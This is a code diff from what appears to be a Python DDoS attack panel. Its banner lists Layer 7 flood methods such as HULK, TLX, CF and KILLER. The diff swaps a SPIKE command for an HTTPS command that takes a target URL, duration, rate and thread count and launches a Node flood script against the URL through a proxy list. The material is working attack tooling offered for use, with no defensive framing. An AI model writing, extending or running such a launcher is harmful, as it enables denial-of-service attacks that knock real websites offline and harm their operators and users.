@@ -211,7 +211,7 @@ def layer7():
                     ║       ●  SPIKE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ║       ●  BROWSER [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ║       ●  HULK    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  TLX     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  SPIKE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  HTTPS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ║       ●  404     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
@@ -522,16 +522,17 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCURSE <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mCURSE https://example.com 120 64')
                 
-                elif sinput == "SPIKE" or sinput == "spike":
+                elif sinput == "HTTPS" or sinput == "https":
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                thread = sin.split()[3]
+                                rate = sin.split()[3]
+                                thread = sin.split()[4]
                                 Screen.wrapper(attack)
-                                os.system(f'cd L7 && node SPIKE.js {url} {thread} {time}')
+                                os.system(f'cd L7 && node HTTPS.js {url} {time} {rate} {thread} proxy.txt')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSPIKE <url> <threads> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSPIKE https://example.com 20 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTPS <url> <time> <rate> <threads>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHTTPS https://example.com 120 64 10 ')
                         
                 elif sinput == "CHAOS" or sinput == "chaos":
                         try:
